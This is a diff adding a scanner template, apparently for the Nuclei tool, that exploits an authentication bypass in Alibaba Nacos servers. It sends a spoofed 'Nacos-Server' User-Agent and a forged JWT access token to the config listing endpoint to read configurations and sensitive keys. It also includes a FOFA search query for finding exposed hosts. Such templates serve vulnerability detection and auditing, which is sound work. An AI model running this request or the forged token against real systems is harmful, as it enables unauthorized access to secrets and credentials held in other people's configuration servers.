@@ -1,0 +1,25 @@
+id: nacos-unauthorize-key-leaks
+
+info:
+  name: nacos unauthorization key leaks
+  author: gaojianli
+  severity: critical
+  description: use nacos unauthorization to gain sensitive key leaks
+  reference: https://github.com/alibaba/nacos/pull/9380
+  metadata:
+    fofa-query: port="8848" && title="HTTP Status 404 - Not Found"
+
+
+requests:
+  - method: GET
+    headers:
+      User-Agent: Nacos-Server
+      accessToken: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA
+    path:
+      - "{{BaseURL}}/nacos/v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=10&tenant=&search=accurate&message=true&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA&username="
+    matchers:
+      - type: word
+        words:
+          - "totalCount"
+          - "pageItems"
+        condition: and
